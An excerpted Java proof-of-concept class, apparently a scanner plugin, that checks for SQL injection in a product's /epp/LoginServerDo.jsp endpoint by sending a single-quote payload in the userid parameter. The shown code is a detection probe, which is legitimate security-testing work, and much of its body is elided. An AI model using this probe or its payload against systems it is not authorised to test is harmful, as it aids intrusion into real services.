...
public class UFNCInjection2 implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "Ufnc SQL Injection2");
//		info.put("location", "epp/LoginServerDo.jsp?userid=1*&pwd=1");
		return info;
	}
	...
	public boolean verify(Map infodict) {
		...
		try {
			String url = String.format("%s://%s:%s/epp/LoginServerDo.jsp?userid=1'&pwd=1", serviceType.contains("https") ? "https":"http", ip, port );
	...
	public static void main(String[] args) {
		...
		System.out.println(new UFNCInjection2().verify(infodict));
	}
